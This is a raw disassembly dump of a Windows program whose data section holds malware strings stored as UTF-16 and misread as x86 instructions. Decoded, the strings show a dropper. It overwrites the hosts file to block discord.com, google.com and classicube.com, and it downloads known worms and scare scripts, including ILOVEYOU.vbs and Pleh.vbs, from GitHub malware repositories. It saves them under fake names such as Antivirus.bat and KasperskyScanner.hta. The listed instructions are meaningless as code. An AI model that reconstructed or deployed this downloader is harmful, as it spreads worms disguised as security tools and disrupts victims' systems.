  403c87:	00 52 00             	add    %dl,0x0(%edx)
  403c8a:	4f                   	dec    %edi
  403c8b:	00 46 00             	add    %al,0x0(%esi)
  403c8e:	49                   	dec    %ecx
  403c8f:	00 4c 00 45          	add    %cl,0x45(%eax,%eax,1)
  403c93:	00 00                	add    %al,(%eax)
  403c95:	13 44 00 6f          	adc    0x6f(%eax,%eax,1),%eax
  403c99:	00 77 00             	add    %dh,0x0(%edi)
  403c9c:	6e                   	outsb  %ds:(%esi),(%dx)
  403c9d:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  403ca1:	00 61 00             	add    %ah,0x0(%ecx)
  403ca4:	64 00 73 00          	add    %dh,%fs:0x0(%ebx)
  403ca8:	00 3f                	add    %bh,(%edi)
  403caa:	43                   	inc    %ebx
  403cab:	00 3a                	add    %bh,(%edx)
  403cad:	00 5c 00 57          	add    %bl,0x57(%eax,%eax,1)
  403cb1:	00 69 00             	add    %ch,0x0(%ecx)
  403cb4:	6e                   	outsb  %ds:(%esi),(%dx)
  403cb5:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  403cb9:	00 77 00             	add    %dh,0x0(%edi)
  403cbc:	73 00                	jae    0x403cbe
  403cbe:	5c                   	pop    %esp
  403cbf:	00 53 00             	add    %dl,0x0(%ebx)
  403cc2:	79 00                	jns    0x403cc4
  403cc4:	73 00                	jae    0x403cc6
  403cc6:	74 00                	je     0x403cc8
  403cc8:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  403ccc:	33 00                	xor    (%eax),%eax
  403cce:	32 00                	xor    (%eax),%al
  403cd0:	5c                   	pop    %esp
  403cd1:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  403cd5:	00 69 00             	add    %ch,0x0(%ecx)
  403cd8:	76 00                	jbe    0x403cda
  403cda:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403cde:	73 00                	jae    0x403ce0
  403ce0:	5c                   	pop    %esp
  403ce1:	00 65 00             	add    %ah,0x0(%ebp)
  403ce4:	74 00                	je     0x403ce6
  403ce6:	63 00                	arpl   %eax,(%eax)
  403ce8:	00 2b                	add    %ch,(%ebx)
  403cea:	5c                   	pop    %esp
  403ceb:	00 53 00             	add    %dl,0x0(%ebx)
  403cee:	79 00                	jns    0x403cf0
  403cf0:	73 00                	jae    0x403cf2
  403cf2:	74 00                	je     0x403cf4
  403cf4:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  403cf8:	33 00                	xor    (%eax),%eax
  403cfa:	32 00                	xor    (%eax),%al
  403cfc:	5c                   	pop    %esp
  403cfd:	00 64 00 72          	add    %ah,0x72(%eax,%eax,1)
  403d01:	00 69 00             	add    %ch,0x0(%ecx)
  403d04:	76 00                	jbe    0x403d06
  403d06:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403d0a:	73 00                	jae    0x403d0c
  403d0c:	5c                   	pop    %esp
  403d0d:	00 65 00             	add    %ah,0x0(%ebp)
  403d10:	74 00                	je     0x403d12
  403d12:	63 00                	arpl   %eax,(%eax)
  403d14:	00 0d 5c 00 68 00    	add    %cl,0x68005c
  403d1a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d1b:	00 73 00             	add    %dh,0x0(%ebx)
  403d1e:	74 00                	je     0x403d20
  403d20:	73 00                	jae    0x403d22
  403d22:	00 80 9f 31 00 32    	add    %al,0x3200319f(%eax)
  403d28:	00 37                	add    %dh,(%edi)
  403d2a:	00 2e                	add    %ch,(%esi)
  403d2c:	00 30                	add    %dh,(%eax)
  403d2e:	00 2e                	add    %ch,(%esi)
  403d30:	00 30                	add    %dh,(%eax)
  403d32:	00 2e                	add    %ch,(%esi)
  403d34:	00 31                	add    %dh,(%ecx)
  403d36:	00 20                	add    %ah,(%eax)
  403d38:	00 77 00             	add    %dh,0x0(%edi)
  403d3b:	77 00                	ja     0x403d3d
  403d3d:	77 00                	ja     0x403d3f
  403d3f:	2e 00 64 00 69       	add    %ah,%cs:0x69(%eax,%eax,1)
  403d44:	00 73 00             	add    %dh,0x0(%ebx)
  403d47:	63 00                	arpl   %eax,(%eax)
  403d49:	6f                   	outsl  %ds:(%esi),(%dx)
  403d4a:	00 72 00             	add    %dh,0x0(%edx)
  403d4d:	64 00 2e             	add    %ch,%fs:(%esi)
  403d50:	00 63 00             	add    %ah,0x0(%ebx)
  403d53:	6f                   	outsl  %ds:(%esi),(%dx)
  403d54:	00 6d 00             	add    %ch,0x0(%ebp)
  403d57:	20 00                	and    %al,(%eax)
  403d59:	31 00                	xor    %eax,(%eax)
  403d5b:	32 00                	xor    (%eax),%al
  403d5d:	37                   	aaa
  403d5e:	00 2e                	add    %ch,(%esi)
  403d60:	00 30                	add    %dh,(%eax)
  403d62:	00 2e                	add    %ch,(%esi)
  403d64:	00 30                	add    %dh,(%eax)
  403d66:	00 2e                	add    %ch,(%esi)
  403d68:	00 31                	add    %dh,(%ecx)
  403d6a:	00 20                	add    %ah,(%eax)
  403d6c:	00 77 00             	add    %dh,0x0(%edi)
  403d6f:	77 00                	ja     0x403d71
  403d71:	77 00                	ja     0x403d73
  403d73:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  403d77:	6f                   	outsl  %ds:(%esi),(%dx)
  403d78:	00 6f 00             	add    %ch,0x0(%edi)
  403d7b:	67 00 6c 00          	add    %ch,0x0(%si)
  403d7f:	65 00 2e             	add    %ch,%gs:(%esi)
  403d82:	00 63 00             	add    %ah,0x0(%ebx)
  403d85:	6f                   	outsl  %ds:(%esi),(%dx)
  403d86:	00 6d 00             	add    %ch,0x0(%ebp)
  403d89:	20 00                	and    %al,(%eax)
  403d8b:	31 00                	xor    %eax,(%eax)
  403d8d:	32 00                	xor    (%eax),%al
  403d8f:	37                   	aaa
  403d90:	00 2e                	add    %ch,(%esi)
  403d92:	00 30                	add    %dh,(%eax)
  403d94:	00 2e                	add    %ch,(%esi)
  403d96:	00 30                	add    %dh,(%eax)
  403d98:	00 2e                	add    %ch,(%esi)
  403d9a:	00 31                	add    %dh,(%ecx)
  403d9c:	00 20                	add    %ah,(%eax)
  403d9e:	00 77 00             	add    %dh,0x0(%edi)
  403da1:	77 00                	ja     0x403da3
  403da3:	77 00                	ja     0x403da5
  403da5:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  403da9:	6c                   	insb   (%dx),%es:(%edi)
  403daa:	00 61 00             	add    %ah,0x0(%ecx)
  403dad:	73 00                	jae    0x403daf
  403daf:	73 00                	jae    0x403db1
  403db1:	69 00 63 00 75 00    	imul   $0x750063,(%eax),%eax
  403db7:	62 00                	bound  %eax,(%eax)
  403db9:	65 00 2e             	add    %ch,%gs:(%esi)
  403dbc:	00 63 00             	add    %ah,0x0(%ebx)
  403dbf:	6f                   	outsl  %ds:(%esi),(%dx)
  403dc0:	00 6d 00             	add    %ch,0x0(%ebp)
  403dc3:	00 03                	add    %al,(%ebx)
  403dc5:	61                   	popa
  403dc6:	00 00                	add    %al,(%eax)
  403dc8:	80 ab 68 00 74 00 74 	subb   $0x74,0x740068(%ebx)
  403dcf:	00 70 00             	add    %dh,0x0(%eax)
  403dd2:	73 00                	jae    0x403dd4
  403dd4:	3a 00                	cmp    (%eax),%al
  403dd6:	2f                   	das
  403dd7:	00 2f                	add    %ch,(%edi)
  403dd9:	00 72 00             	add    %dh,0x0(%edx)
  403ddc:	61                   	popa
  403ddd:	00 77 00             	add    %dh,0x0(%edi)
  403de0:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  403de4:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  403dea:	75 00                	jne    0x403dec
  403dec:	62 00                	bound  %eax,(%eax)
  403dee:	75 00                	jne    0x403df0
  403df0:	73 00                	jae    0x403df2
  403df2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403df6:	63 00                	arpl   %eax,(%eax)
  403df8:	6f                   	outsl  %ds:(%esi),(%dx)
  403df9:	00 6e 00             	add    %ch,0x0(%esi)
  403dfc:	74 00                	je     0x403dfe
  403dfe:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403e02:	74 00                	je     0x403e04
  403e04:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  403e08:	6f                   	outsl  %ds:(%esi),(%dx)
  403e09:	00 6d 00             	add    %ch,0x0(%ebp)
  403e0c:	2f                   	das
  403e0d:	00 70 00             	add    %dh,0x0(%eax)
  403e10:	61                   	popa
  403e11:	00 6e 00             	add    %ch,0x0(%esi)
  403e14:	6b 00 6f             	imul   $0x6f,(%eax),%eax
  403e17:	00 7a 00             	add    %bh,0x0(%edx)
  403e1a:	61                   	popa
  403e1b:	00 2d 00 70 00 6c    	add    %ch,0x6c007000
  403e21:	00 2f                	add    %ch,(%edi)
  403e23:	00 6d 00             	add    %ch,0x0(%ebp)
  403e26:	61                   	popa
  403e27:	00 6c 00 77          	add    %ch,0x77(%eax,%eax,1)
  403e2b:	00 61 00             	add    %ah,0x0(%ecx)
  403e2e:	72 00                	jb     0x403e30
  403e30:	65 00 64 00 61       	add    %ah,%gs:0x61(%eax,%eax,1)
  403e35:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  403e39:	00 62 00             	add    %ah,0x0(%edx)
  403e3c:	61                   	popa
  403e3d:	00 73 00             	add    %dh,0x0(%ebx)
  403e40:	65 00 2f             	add    %ch,%gs:(%edi)
  403e43:	00 6d 00             	add    %ch,0x0(%ebp)
  403e46:	61                   	popa
  403e47:	00 69 00             	add    %ch,0x0(%ecx)
  403e4a:	6e                   	outsb  %ds:(%esi),(%dx)
  403e4b:	00 2f                	add    %ch,(%edi)
  403e4d:	00 65 00             	add    %ah,0x0(%ebp)
  403e50:	5f                   	pop    %edi
  403e51:	00 5f 00             	add    %bl,0x0(%edi)
  403e54:	5f                   	pop    %edi
  403e55:	00 5f 00             	add    %bl,0x0(%edi)
  403e58:	5f                   	pop    %edi
  403e59:	00 5f 00             	add    %bl,0x0(%edi)
  403e5c:	5f                   	pop    %edi
  403e5d:	00 5f 00             	add    %bl,0x0(%edi)
  403e60:	5f                   	pop    %edi
  403e61:	00 5f 00             	add    %bl,0x0(%edi)
  403e64:	5f                   	pop    %edi
  403e65:	00 5f 00             	add    %bl,0x0(%edi)
  403e68:	5f                   	pop    %edi
  403e69:	00 5f 00             	add    %bl,0x0(%edi)
  403e6c:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  403e70:	61                   	popa
  403e71:	00 74 00 01          	add    %dh,0x1(%eax,%eax,1)
  403e75:	1d 5c 00 41 00       	sbb    $0x41005c,%eax
  403e7a:	6e                   	outsb  %ds:(%esi),(%dx)
  403e7b:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403e7f:	00 76 00             	add    %dh,0x0(%esi)
  403e82:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  403e88:	73 00                	jae    0x403e8a
  403e8a:	2e 00 62 00          	add    %ah,%cs:0x0(%edx)
  403e8e:	61                   	popa
  403e8f:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  403e93:	80 ad 68 00 74 00 74 	subb   $0x74,0x740068(%ebp)
  403e9a:	00 70 00             	add    %dh,0x0(%eax)
  403e9d:	73 00                	jae    0x403e9f
  403e9f:	3a 00                	cmp    (%eax),%al
  403ea1:	2f                   	das
  403ea2:	00 2f                	add    %ch,(%edi)
  403ea4:	00 72 00             	add    %dh,0x0(%edx)
  403ea7:	61                   	popa
  403ea8:	00 77 00             	add    %dh,0x0(%edi)
  403eab:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  403eaf:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  403eb5:	75 00                	jne    0x403eb7
  403eb7:	62 00                	bound  %eax,(%eax)
  403eb9:	75 00                	jne    0x403ebb
  403ebb:	73 00                	jae    0x403ebd
  403ebd:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403ec1:	63 00                	arpl   %eax,(%eax)
  403ec3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec4:	00 6e 00             	add    %ch,0x0(%esi)
  403ec7:	74 00                	je     0x403ec9
  403ec9:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403ecd:	74 00                	je     0x403ecf
  403ecf:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  403ed3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ed4:	00 6d 00             	add    %ch,0x0(%ebp)
  403ed7:	2f                   	das
  403ed8:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  403edc:	00 32                	add    %dh,(%edx)
  403ede:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  403ee2:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  403ee6:	00 73 00             	add    %dh,0x0(%ebx)
  403ee9:	2f                   	das
  403eea:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  403eee:	00 65 00             	add    %ah,0x0(%ebp)
  403ef1:	2d 00 4d 00 41       	sub    $0x41004d00,%eax
  403ef6:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  403efa:	00 41 00             	add    %al,0x0(%ecx)
  403efd:	52                   	push   %edx
  403efe:	00 45 00             	add    %al,0x0(%ebp)
  403f01:	2d 00 52 00 65       	sub    $0x65005200,%eax
  403f06:	00 70 00             	add    %dh,0x0(%eax)
  403f09:	6f                   	outsl  %ds:(%esi),(%dx)
  403f0a:	00 2f                	add    %ch,(%edi)
  403f0c:	00 6d 00             	add    %ch,0x0(%ebp)
  403f0f:	61                   	popa
  403f10:	00 73 00             	add    %dh,0x0(%ebx)
  403f13:	74 00                	je     0x403f15
  403f15:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403f19:	2f                   	das
  403f1a:	00 45 00             	add    %al,0x0(%ebp)
  403f1d:	6d                   	insl   (%dx),%es:(%edi)
  403f1e:	00 61 00             	add    %ah,0x0(%ecx)
  403f21:	69 00 6c 00 2d 00    	imul   $0x2d006c,(%eax),%eax
  403f27:	57                   	push   %edi
  403f28:	00 6f 00             	add    %ch,0x0(%edi)
  403f2b:	72 00                	jb     0x403f2d
  403f2d:	6d                   	insl   (%dx),%es:(%edi)
  403f2e:	00 2f                	add    %ch,(%edi)
  403f30:	00 50 00             	add    %dl,0x0(%eax)
  403f33:	6c                   	insb   (%dx),%es:(%edi)
  403f34:	00 65 00             	add    %ah,0x0(%ebp)
  403f37:	68 00 2e 00 76       	push   $0x76002e00
  403f3c:	00 62 00             	add    %ah,0x0(%edx)
  403f3f:	73 00                	jae    0x403f41
  403f41:	01 1f                	add    %ebx,(%edi)
  403f43:	5c                   	pop    %esp
  403f44:	00 41 00             	add    %al,0x0(%ecx)
  403f47:	6e                   	outsb  %ds:(%esi),(%dx)
  403f48:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403f4c:	00 76 00             	add    %dh,0x0(%esi)
  403f4f:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  403f55:	73 00                	jae    0x403f57
  403f57:	32 00                	xor    (%eax),%al
  403f59:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  403f5d:	62 00                	bound  %eax,(%eax)
  403f5f:	73 00                	jae    0x403f61
  403f61:	00 80 b5 68 00 74    	add    %al,0x740068b5(%eax)
  403f67:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  403f6b:	00 73 00             	add    %dh,0x0(%ebx)
  403f6e:	3a 00                	cmp    (%eax),%al
  403f70:	2f                   	das
  403f71:	00 2f                	add    %ch,(%edi)
  403f73:	00 72 00             	add    %dh,0x0(%edx)
  403f76:	61                   	popa
  403f77:	00 77 00             	add    %dh,0x0(%edi)
  403f7a:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  403f7e:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  403f84:	75 00                	jne    0x403f86
  403f86:	62 00                	bound  %eax,(%eax)
  403f88:	75 00                	jne    0x403f8a
  403f8a:	73 00                	jae    0x403f8c
  403f8c:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403f90:	63 00                	arpl   %eax,(%eax)
  403f92:	6f                   	outsl  %ds:(%esi),(%dx)
  403f93:	00 6e 00             	add    %ch,0x0(%esi)
  403f96:	74 00                	je     0x403f98
  403f98:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  403f9c:	74 00                	je     0x403f9e
  403f9e:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  403fa2:	6f                   	outsl  %ds:(%esi),(%dx)
  403fa3:	00 6d 00             	add    %ch,0x0(%ebp)
  403fa6:	2f                   	das
  403fa7:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  403fab:	00 32                	add    %dh,(%edx)
  403fad:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  403fb1:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  403fb5:	00 73 00             	add    %dh,0x0(%ebx)
  403fb8:	2f                   	das
  403fb9:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  403fbd:	00 65 00             	add    %ah,0x0(%ebp)
  403fc0:	2d 00 4d 00 41       	sub    $0x41004d00,%eax
  403fc5:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  403fc9:	00 41 00             	add    %al,0x0(%ecx)
  403fcc:	52                   	push   %edx
  403fcd:	00 45 00             	add    %al,0x0(%ebp)
  403fd0:	2d 00 52 00 65       	sub    $0x65005200,%eax
  403fd5:	00 70 00             	add    %dh,0x0(%eax)
  403fd8:	6f                   	outsl  %ds:(%esi),(%dx)
  403fd9:	00 2f                	add    %ch,(%edi)
  403fdb:	00 6d 00             	add    %ch,0x0(%ebp)
  403fde:	61                   	popa
  403fdf:	00 73 00             	add    %dh,0x0(%ebx)
  403fe2:	74 00                	je     0x403fe4
  403fe4:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403fe8:	2f                   	das
  403fe9:	00 45 00             	add    %al,0x0(%ebp)
  403fec:	6d                   	insl   (%dx),%es:(%edi)
  403fed:	00 61 00             	add    %ah,0x0(%ecx)
  403ff0:	69 00 6c 00 2d 00    	imul   $0x2d006c,(%eax),%eax
  403ff6:	57                   	push   %edi
  403ff7:	00 6f 00             	add    %ch,0x0(%edi)
  403ffa:	72 00                	jb     0x403ffc
  403ffc:	6d                   	insl   (%dx),%es:(%edi)
  403ffd:	00 2f                	add    %ch,(%edi)
  403fff:	00 49 00             	add    %cl,0x0(%ecx)
  404002:	4c                   	dec    %esp
  404003:	00 4f 00             	add    %cl,0x0(%edi)
  404006:	56                   	push   %esi
  404007:	00 45 00             	add    %al,0x0(%ebp)
  40400a:	59                   	pop    %ecx
  40400b:	00 4f 00             	add    %cl,0x0(%edi)
  40400e:	55                   	push   %ebp
  40400f:	00 2e                	add    %ch,(%esi)
  404011:	00 76 00             	add    %dh,0x0(%esi)
  404014:	62 00                	bound  %eax,(%eax)
  404016:	73 00                	jae    0x404018
  404018:	01 1f                	add    %ebx,(%edi)
  40401a:	5c                   	pop    %esp
  40401b:	00 41 00             	add    %al,0x0(%ecx)
  40401e:	6e                   	outsb  %ds:(%esi),(%dx)
  40401f:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  404023:	00 76 00             	add    %dh,0x0(%esi)
  404026:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  40402c:	73 00                	jae    0x40402e
  40402e:	33 00                	xor    (%eax),%eax
  404030:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  404034:	62 00                	bound  %eax,(%eax)
  404036:	73 00                	jae    0x404038
  404038:	00 80 af 68 00 74    	add    %al,0x740068af(%eax)
  40403e:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  404042:	00 73 00             	add    %dh,0x0(%ebx)
  404045:	3a 00                	cmp    (%eax),%al
  404047:	2f                   	das
  404048:	00 2f                	add    %ch,(%edi)
  40404a:	00 72 00             	add    %dh,0x0(%edx)
  40404d:	61                   	popa
  40404e:	00 77 00             	add    %dh,0x0(%edi)
  404051:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  404055:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40405b:	75 00                	jne    0x40405d
  40405d:	62 00                	bound  %eax,(%eax)
  40405f:	75 00                	jne    0x404061
  404061:	73 00                	jae    0x404063
  404063:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404067:	63 00                	arpl   %eax,(%eax)
  404069:	6f                   	outsl  %ds:(%esi),(%dx)
  40406a:	00 6e 00             	add    %ch,0x0(%esi)
  40406d:	74 00                	je     0x40406f
  40406f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  404073:	74 00                	je     0x404075
  404075:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  404079:	6f                   	outsl  %ds:(%esi),(%dx)
  40407a:	00 6d 00             	add    %ch,0x0(%ebp)
  40407d:	2f                   	das
  40407e:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  404082:	00 32                	add    %dh,(%edx)
  404084:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  404088:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40408c:	00 73 00             	add    %dh,0x0(%ebx)
  40408f:	2f                   	das
  404090:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  404094:	00 65 00             	add    %ah,0x0(%ebp)
  404097:	2d 00 4d 00 41       	sub    $0x41004d00,%eax
  40409c:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  4040a0:	00 41 00             	add    %al,0x0(%ecx)
  4040a3:	52                   	push   %edx
  4040a4:	00 45 00             	add    %al,0x0(%ebp)
  4040a7:	2d 00 52 00 65       	sub    $0x65005200,%eax
  4040ac:	00 70 00             	add    %dh,0x0(%eax)
  4040af:	6f                   	outsl  %ds:(%esi),(%dx)
  4040b0:	00 2f                	add    %ch,(%edi)
  4040b2:	00 6d 00             	add    %ch,0x0(%ebp)
  4040b5:	61                   	popa
  4040b6:	00 73 00             	add    %dh,0x0(%ebx)
  4040b9:	74 00                	je     0x4040bb
  4040bb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4040bf:	2f                   	das
  4040c0:	00 45 00             	add    %al,0x0(%ebp)
  4040c3:	6d                   	insl   (%dx),%es:(%edi)
  4040c4:	00 61 00             	add    %ah,0x0(%ecx)
  4040c7:	69 00 6c 00 2d 00    	imul   $0x2d006c,(%eax),%eax
  4040cd:	57                   	push   %edi
  4040ce:	00 6f 00             	add    %ch,0x0(%edi)
  4040d1:	72 00                	jb     0x4040d3
  4040d3:	6d                   	insl   (%dx),%es:(%edi)
  4040d4:	00 2f                	add    %ch,(%edi)
  4040d6:	00 53 00             	add    %dl,0x0(%ebx)
  4040d9:	63 00                	arpl   %eax,(%eax)
  4040db:	61                   	popa
  4040dc:	00 72 00             	add    %dh,0x0(%edx)
  4040df:	65 00 2e             	add    %ch,%gs:(%esi)
  4040e2:	00 68 00             	add    %ch,0x0(%eax)
  4040e5:	74 00                	je     0x4040e7
  4040e7:	61                   	popa
  4040e8:	00 01                	add    %al,(%ecx)
  4040ea:	2b 5c 00 4b          	sub    0x4b(%eax,%eax,1),%ebx
  4040ee:	00 61 00             	add    %ah,0x0(%ecx)
  4040f1:	73 00                	jae    0x4040f3
  4040f3:	70 00                	jo     0x4040f5
  4040f5:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4040f9:	73 00                	jae    0x4040fb
  4040fb:	6b 00 79             	imul   $0x79,(%eax),%eax
  4040fe:	00 53 00             	add    %dl,0x0(%ebx)
  404101:	63 00                	arpl   %eax,(%eax)
  404103:	61                   	popa
  404104:	00 6e 00             	add    %ch,0x0(%esi)
  404107:	6e                   	outsb  %ds:(%esi),(%dx)
  404108:	00 65 00             	add    %ah,0x0(%ebp)
  40410b:	72 00                	jb     0x40410d
  40410d:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  404111:	74 00                	je     0x404113
  404113:	61                   	popa
  404114:	00 00                	add    %al,(%eax)
  404116:	80 ad 68 00 74 00 74 	subb   $0x74,0x740068(%ebp)
  40411d:	00 70 00             	add    %dh,0x0(%eax)
  404120:	73 00                	jae    0x404122
  404122:	3a 00                	cmp    (%eax),%al
  404124:	2f                   	das
  404125:	00 2f                	add    %ch,(%edi)
  404127:	00 72 00             	add    %dh,0x0(%edx)
  40412a:	61                   	popa
  40412b:	00 77 00             	add    %dh,0x0(%edi)
  40412e:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  404132:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  404138:	75 00                	jne    0x40413a
  40413a:	62 00                	bound  %eax,(%eax)
  40413c:	75 00                	jne    0x40413e
  40413e:	73 00                	jae    0x404140
  404140:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404144:	63 00                	arpl   %eax,(%eax)
  404146:	6f                   	outsl  %ds:(%esi),(%dx)
  404147:	00 6e 00             	add    %ch,0x0(%esi)
  40414a:	74 00                	je     0x40414c
  40414c:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  404150:	74 00                	je     0x404152
  404152:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  404156:	6f                   	outsl  %ds:(%esi),(%dx)
  404157:	00 6d 00             	add    %ch,0x0(%ebp)
  40415a:	2f                   	das
  40415b:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40415f:	00 32                	add    %dh,(%edx)
  404161:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  404165:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  404169:	00 73 00             	add    %dh,0x0(%ebx)
  40416c:	2f                   	das
  40416d:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  404171:	00 65 00             	add    %ah,0x0(%ebp)
  404174:	2d 00 4d 00 41       	sub    $0x41004d00,%eax
  404179:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40417d:	00 41 00             	add    %al,0x0(%ecx)
  404180:	52                   	push   %edx
  404181:	00 45 00             	add    %al,0x0(%ebp)
  404184:	2d 00 52 00 65       	sub    $0x65005200,%eax
  404189:	00 70 00             	add    %dh,0x0(%eax)
  40418c:	6f                   	outsl  %ds:(%esi),(%dx)
  40418d:	00 2f                	add    %ch,(%edi)
  40418f:	00 6d 00             	add    %ch,0x0(%ebp)
  404192:	61                   	popa
  404193:	00 73 00             	add    %dh,0x0(%ebx)
  404196:	74 00                	je     0x404198
  404198:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40419c:	2f                   	das
  40419d:	00 45 00             	add    %al,0x0(%ebp)
  4041a0:	6d                   	insl   (%dx),%es:(%edi)
  4041a1:	00 61 00             	add    %ah,0x0(%ecx)
  4041a4:	69 00 6c 00 2d 00    	imul   $0x2d006c,(%eax),%eax
  4041aa:	57                   	push   %edi
  4041ab:	00 6f 00             	add    %ch,0x0(%edi)
  4041ae:	72 00                	jb     0x4041b0
  4041b0:	6d                   	insl   (%dx),%es:(%edi)
  4041b1:	00 2f                	add    %ch,(%edi)
  4041b3:	00 4a 00             	add    %cl,0x0(%edx)
  4041b6:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4041ba:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  4041be:	74 00                	je     0x4041c0
  4041c0:	6d                   	insl   (%dx),%es:(%edi)
  4041c1:	00 6c 00 01          	add    %ch,0x1(%eax,%eax,1)
  4041c5:	25 5c 00 59 00       	and    $0x59005c,%eax
  4041ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4041cb:	00 75 00             	add    %dh,0x0(%ebp)
  4041ce:	72 00                	jb     0x4041d0
  4041d0:	4d                   	dec    %ebp
  4041d1:	00 6f 00             	add    %ch,0x0(%edi)
  4041d4:	6d                   	insl   (%dx),%es:(%edi)
  4041d5:	00 49 00             	add    %cl,0x0(%ecx)
  4041d8:	73 00                	jae    0x4041da
  4041da:	47                   	inc    %edi
  4041db:	00 61 00             	add    %ah,0x0(%ecx)
  4041de:	79 00                	jns    0x4041e0
  4041e0:	2e 00 68 00          	add    %ch,%cs:0x0(%eax)
  4041e4:	74 00                	je     0x4041e6
  4041e6:	6d                   	insl   (%dx),%es:(%edi)
  4041e7:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  4041eb:	80 c7 68             	add    $0x68,%bh
  4041ee:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  4041f2:	00 70 00             	add    %dh,0x0(%eax)
  4041f5:	73 00                	jae    0x4041f7
  4041f7:	3a 00                	cmp    (%eax),%al
  4041f9:	2f                   	das
  4041fa:	00 2f                	add    %ch,(%edi)
  4041fc:	00 72 00             	add    %dh,0x0(%edx)
  4041ff:	61                   	popa
  404200:	00 77 00             	add    %dh,0x0(%edi)
  404203:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  404207:	69 00 74 00 68 00    	imul   $0x680074,(%eax),%eax
  40420d:	75 00                	jne    0x40420f
  40420f:	62 00                	bound  %eax,(%eax)
  404211:	75 00                	jne    0x404213
  404213:	73 00                	jae    0x404215
  404215:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  404219:	63 00                	arpl   %eax,(%eax)
  40421b:	6f                   	outsl  %ds:(%esi),(%dx)
  40421c:	00 6e 00             	add    %ch,0x0(%esi)
  40421f:	74 00                	je     0x404221
  404221:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  404225:	74 00                	je     0x404227
  404227:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  40422b:	6f                   	outsl  %ds:(%esi),(%dx)
  40422c:	00 6d 00             	add    %ch,0x0(%ebp)
  40422f:	2f                   	das
  404230:	00 41 00             	add    %al,0x0(%ecx)
  404233:	68 00 6d 00 65       	push   $0x65006d00
